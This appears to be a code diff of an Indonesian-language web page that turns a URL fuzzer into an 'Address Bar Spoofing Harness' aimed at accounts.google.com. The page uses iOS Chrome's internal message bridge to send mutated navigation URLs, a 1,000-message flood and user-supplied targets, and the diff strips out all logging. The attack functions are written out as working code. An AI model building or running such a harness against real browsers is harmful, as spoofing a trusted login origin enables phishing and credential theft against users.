@@ -2,7 +2,7 @@
 <html lang="id">
 <head>
     <meta charset="utf-8">
-    <title>Advanced Mutation Fuzzer &amp; Boundary Harness - Hybrid Pro (Hardened)</title>
+    <title>Address Bar Spoofing Harness - Hybrid Pro</title>
     <style>
         :root {
             --bg-color: #05070b;
@@ -75,18 +75,6 @@
             font-family: monospace;
         }
 
-        pre {
-            background: var(--bg-color);
-            color: #4ade80;
-            padding: 14px;
-            border-radius: 6px;
-            font-size: 12px;
-            overflow-x: auto;
-            line-height: 1.4;
-            border: 1px solid var(--border-color);
-            max-height: 320px;
-        }
-
         .btn-group {
             display: flex;
             gap: 10px;
@@ -138,8 +126,8 @@
 <body>
 
     <div class="card">
-        <h1>Advanced Mutation Fuzzer &amp; Boundary Harness</h1>
-        <p>Target Uji Silang: <span class="target">accounts.google.com &amp; example.com</span></p>
+        <h1>Address Bar Spoofing &amp; Mutation Harness</h1>
+        <p>Target Uji: <span class="target">accounts.google.com &amp; example.com</span></p>
         <p>Status Origin Asli: <code id="real-origin" class="info">Memuat...</code></p>
         
         <div>
@@ -160,11 +148,6 @@
         </div>
     </div>
 
-    <div class="card">
-        <h3>Log Eksekusi &amp; Diagnostik Fuzzer:</h3>
-        <pre id="fuzz-log">[*] Modul Fuzzer Hybrid siap diinisialisasi...\n</pre>
-    </div>
-
     <script>
     (function() {
         'use strict';
@@ -172,14 +155,6 @@
         let sentCount = 0;
         let errorCount = 0;
         let isRunning = false;
-
-        function log(msg) {
-            const pre = document.getElementById('fuzz-log');
-            if (pre) {
-                pre.textContent += msg + '\n';
-                pre.scrollTop = pre.scrollHeight;
-            }
-        }
 
         function updateStats() {
             const sentEl = document.getElementById('stat-sent');
@@ -192,7 +167,6 @@
         if (realOriginEl) {
             realOriginEl.textContent = location.origin || '(opaque)';
         }
-        log('[-] Current Origin: ' + location.origin);
 
         let mh = null;
         const hasNativeBridge = window.webkit && 
@@ -201,11 +175,9 @@
         
         if (hasNativeBridge) {
             mh = window.webkit.messageHandlers;
-            log('[+] Handler "NavigationEventMessage" terdeteksi aktif (Live iOS Bridge).');
             const bridgeEl = document.getElementById('stat-bridge');
             if (bridgeEl) bridgeEl.textContent = 'Live iOS Bridge';
         } else {
-            log('[!] PERINGATAN: Bukan lingkungan iOS Chrome. Mengaktifkan Hybrid Simulation Mode.');
             const bridgeEl = document.getElementById('stat-bridge');
             if (bridgeEl) bridgeEl.textContent = 'Simulation Mode (Mock)';
             mh = {
@@ -221,12 +193,9 @@
         try {
             if (window.__gCrWeb && typeof window.__gCrWeb.getFrameId === 'function') {
                 frameId = window.__gCrWeb.getFrameId();
-                log('[+] frame_id berhasil dibaca via getFrameId(): ' + frameId);
-            } else {
-                log('[*] Menggunakan default/mock frame_id untuk pengujian.');
             }
         } catch (e) {
-            log('[!] Catatan frameId: ' + e.message);
+            // Abaikan error frameId
         }
 
         function generateMutatedVectors() {
@@ -245,6 +214,7 @@
             ];
 
             let vectors = [];
+            
             baseDomains.forEach(function(domain) {
                 schemes.forEach(function(scheme) {
                     paths.forEach(function(path) {
@@ -268,7 +238,6 @@
         }
 
         const mutatedVectors = generateMutatedVectors();
-        log('[+] Berhasil memuat ' + mutatedVectors.length + ' variasi vektor mutasi URL.');
 
         function sendNavigationMessage(targetUrl, stateObj) {
             try {
@@ -293,45 +262,32 @@
                 return true;
             } catch (err) {
                 errorCount++;
-                log('   [!] Error Bridge: ' + err.message);
                 return false;
             }
         }
 
         function executeMutationTest() {
-            if (isRunning) {
-                log('[!] Pengujian lain sedang berjalan. Harap tunggu.');
-                return;
-            }
+            if (isRunning) return;
             isRunning = true;
-            log('\n[*] Memulai pengiriman batch mutasi secara asinkron...');
             let index = 0;
 
             function processNext() {
                 if (index < mutatedVectors.length) {
                     let vector = mutatedVectors[index];
-                    let success = sendNavigationMessage(vector, { mutationIndex: index, timestamp: Date.now() });
-                    if (success) {
-                        log('   [ok] Mutasi #' + (index + 1) + ' terkirim -> ' + vector);
-                    }
+                    sendNavigationMessage(vector, { mutationIndex: index, timestamp: Date.now() });
                     index++;
                     updateStats();
                     setTimeout(processNext, 15);
                 } else {
                     isRunning = false;
-                    log('[*] Batch mutasi selesai diproses.');
                 }
             }
             processNext();
         }
 
         function executeFloodTest() {
-            if (isRunning) {
-                log('[!] Pengujian lain sedang berjalan. Harap tunggu.');
-                return;
-            }
+            if (isRunning) return;
             isRunning = true;
-            log('\n[*] Memulai Flood Test stabil (1,000 iterasi)...');
             let count = 0;
             const total = 1000;
 
@@ -343,13 +299,11 @@
                 }
                 count = limit;
                 updateStats();
-                log('   [>] Progress Flood: ' + count + ' / ' + total + ' pesan terkirim...');
 
                 if (count < total) {
                     setTimeout(sendBatch, 10);
                 } else {
                     isRunning = false;
-                    log('[+] Flood Test 1,000 iterasi selesai dengan stabil.');
                 }
             }
             sendBatch();
@@ -365,12 +319,8 @@
                         alert('Masukkan URL target terlebih dahulu!');
                         return;
                     }
-                    log('\n[*] Menguji URL Kustom: ' + customUrl);
-                    let success = sendNavigationMessage(customUrl, { customTest: true, time: Date.now() });
+                    sendNavigationMessage(customUrl, { customTest: true, time: Date.now() });
                     updateStats();
-                    if (success) {
-                        log('   [ok] Pesan URL kustom berhasil dikirim.');
-                    }
                 });
             }
 
@@ -391,7 +341,6 @@
                     errorCount = 0;
                     isRunning = false;
                     updateStats();
-                    log('[*] Statistik berhasil direset.');
                 });
             }
         });
